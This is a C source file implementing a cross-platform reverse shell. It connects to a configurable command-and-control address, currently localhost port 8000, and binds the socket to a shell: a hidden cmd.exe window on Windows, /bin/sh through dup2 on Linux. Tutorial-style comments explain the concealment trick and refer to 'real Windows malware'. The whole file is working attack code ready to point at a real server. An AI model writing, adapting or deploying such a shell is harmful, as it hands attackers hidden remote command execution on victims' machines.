#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#ifdef _WIN32
    #include <winsock2.h>
    #include <windows.h>
    #include <ws2tcpip.h>
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <unistd.h>
    #include <arpa/inet.h>
    #include <sys/socket.h>
#endif

// CONFIGURATION
#define C2_IP "127.0.0.1"
#define C2_PORT 8000

int main() {
    // --- WINDOWS INITIALIZATION ---
    #ifdef _WIN32
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            return 1; // Failed to initialize Winsock
        }
    #endif

    struct sockaddr_in sa;
    int s;

    // 1. Create Socket (Same for both, mostly)
    s = socket(AF_INET, SOCK_STREAM, 0);
    if (s < 0) return 1;

    // 2. Setup Address
    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(C2_IP);
    sa.sin_port = htons(C2_PORT);

    // 3. Connect
    // Note: In real Windows malware, you need a cast for (SOCKET)
    if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        return 1;
    }

    // Send Greeting
    char *msg = "[+] Connected from the shadows...\n";
    send(s, msg, strlen(msg), 0);

    // 4. Redirect Plumbing (The OS Split)
    #ifdef _WIN32
        // --- WINDOWS STRATEGY (CreateProcess) ---
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        
        // Zero out the memory
        memset(&si, 0, sizeof(si));
        si.cb = sizeof(si);
        
        // ENABLE FLAGS:
        // STARTF_USESTDHANDLES -> Let me control the pipes (Input/Output)
        // STARTF_USESHOWWINDOW -> Let me control if the window is visible
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        
        // THE INVISIBILITY CLOAK:
        si.wShowWindow = SW_HIDE; 

        // Redirect pipes to the socket
        si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)s;

        // Spawn cmd.exe (HIDDEN)
        // Note: The 'CREATE_NO_WINDOW' flag in CreateProcess is also an option, 
        // but manipulating STARTUPINFO is often more reliable for interactive shells.
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
        
        WaitForSingleObject(pi.hProcess, INFINITE);
    #else
        // --- LINUX STRATEGY (dup2) ---
        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        execve("/bin/sh", NULL, NULL);
    #endif

    return 0;
}